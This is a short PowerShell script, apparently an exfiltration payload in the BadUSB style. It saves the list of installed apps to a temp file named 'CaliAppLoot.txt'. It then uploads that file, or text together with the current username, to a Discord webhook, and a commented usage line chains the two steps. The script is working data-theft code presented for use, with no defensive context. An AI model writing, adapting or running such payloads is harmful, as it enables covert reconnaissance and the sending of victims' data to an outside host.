function Get-AppInfo {
    $tempDir = [System.IO.Path]::GetTempPath()
    $outputFile = Join-Path $tempDir "CaliAppLoot.txt"

    # Run the Get-AppxSetting command and redirect its output to the file
    Get-AppxPackage > $outputFile

    Write-Host "App information saved to: $outputFile"
}


function Upload-Discord {
    param (
        [string]$file,
        [string]$text,
        [string]$webhookUrl
    )

    if ($text) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }
    }
    elseif ($file) {
        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)
    }
}


#Example usage:

# Get-AppInfo; Upload-Discord -webhookUrl 'YOUR WEBHOOK HERE' -file "$env:TEMP\CaliAppLoot.txt" | Out-Null
